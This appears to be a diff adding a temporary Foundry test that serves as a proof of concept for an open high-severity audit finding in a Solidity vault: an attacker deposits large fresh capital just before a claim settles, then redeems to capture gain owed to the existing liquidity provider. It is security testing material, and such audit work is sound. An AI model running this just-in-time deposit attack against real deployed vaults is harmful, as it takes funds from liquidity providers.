@@ -1,0 +1,38 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.24;
+
+import {Base} from "./Base.t.sol";
+
+/// @dev Temporary proof of concept for the open High finding (LP gain sniping). Not kept in the suite.
+contract PocSniping is Base {
+    function test_poc_jitDepositCapturesAccruedGain() public {
+        (uint256 id, uint256 cost) = sellA(10e18); // LP's 100k funds a ~10.9k claim, held at cost
+        (, uint64 settleAt) = claims.meta(id);
+        vm.warp(settleAt);
+        pushNav(address(fundA), NAV_A, 8, uint64(block.timestamp), 0);
+
+        uint256 lpBefore = vault.convertToAssets(vault.balanceOf(lp));
+
+        // attacker arrives one step before settle with fresh capital, then exits
+        address attacker = makeAddr("attacker");
+        uint256 stake = 1_000_000e6;
+        usdc.mint(attacker, stake);
+        vm.startPrank(attacker);
+        usdc.approve(address(vault), type(uint256).max);
+        vault.deposit(stake, attacker);
+        vm.stopPrank();
+
+        uint256 received = vault.settle(id);
+        uint256 gain = received - cost;
+
+        uint256 sh = vault.balanceOf(attacker);
+        uint256 out = vault.convertToAssets(sh);
+        vm.prank(attacker);
+        vault.redeem(sh, attacker, attacker);
+        uint256 lpAfter = vault.convertToAssets(vault.balanceOf(lp));
+
+        emit log_named_uint("claim gain (USDC 6dp)", gain);
+        emit log_named_uint("attacker profit", out > stake ? out - stake : 0);
+        emit log_named_uint("LP gain actually received", lpAfter - lpBefore);
+    }
+}
